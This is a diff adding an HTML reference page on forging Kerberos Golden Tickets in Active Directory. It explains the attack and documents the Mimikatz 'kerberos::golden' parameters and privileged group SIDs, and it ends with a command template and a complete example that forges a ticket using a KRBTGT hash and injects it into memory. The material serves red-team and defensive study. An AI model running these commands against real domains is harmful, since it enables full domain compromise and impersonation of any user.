@@ -1,0 +1,47 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Golden Ticket</title>
+</head><body><b>Golden Ticket</b>&nbsp;<br/>
+A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.<br/>
+&nbsp;<br/>
+A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain. Since the Golden Ticket is an authentication ticket (TGT described below), its scope is the entire domain (and the AD forest by leveraging SID History) since the TGT is used to get service tickets (TGS) used to access resources. The Golden Ticket (TGT) contains user group membership information (PAC) and is signed and encrypted using the domain’s Kerberos service account (KRBTGT) which can only be opened and read by the KRBTGT account.<br/>
+&nbsp;<br/>
+To summarize, once an attacker gets access to the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.<br/>
+&nbsp;<br/>
+Mimikatz Golden Ticket Command Reference:<br/>
+&nbsp;<br/>
+The Mimikatz command to create a golden ticket is “kerberos::golden”<br/>
+&nbsp;<ul><li>&nbsp;/domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.</li>
+<li>/sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.</li>
+<li>/sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain  “S-1-5-21-1473643419-774954089-5872329127-519”. T<a href="https://adsecurity.org/?p=1640">his parameter adds the provided SIDs to the SID History parameter.</a></li>
+<li>/user – username to impersonate</li>
+<li>/groups (optional) – group RIDs the user is a member of (the first is the primary group).</li>
+<li>Add user or computer account RIDs to receive the same access.</li>
+<li>Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).</li>
+<li>/krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.</li>
+<li>/ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.</li>
+<li>/ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.</li>
+<li>/id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).</li>
+<li>/startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.</li>
+<li>/endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).</li>
+<li>/renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).</li>
+<li>/sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).</li>
+<li>/aes128 – the AES128 key</li>
+<li>/aes256 – the AES256 key</li>
+</ul>
+<br/>
+Golden Ticket Default Groups:<br/>
+&nbsp;<ul><li>&nbsp;Domain Users SID: S-1-5-21&lt;DOMAINID&gt;-513</li>
+<li>Domain Admins SID: S-1-5-21&lt;DOMAINID&gt;-512</li>
+<li>Schema Admins SID: S-1-5-21&lt;DOMAINID&gt;-518</li>
+<li>Enterprise Admins SID: S-1-5-21&lt;DOMAINID&gt;-519  (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)</li>
+<li>Group Policy Creator Owners SID: S-1-5-21&lt;DOMAINID&gt;-520</li>
+</ul>
+<br/>
+kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt<br/>
+&nbsp;<br/>
+Command Example:<br/>
+<i>.\mimikatz “kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt” exit</i><br/>
+</body></html>
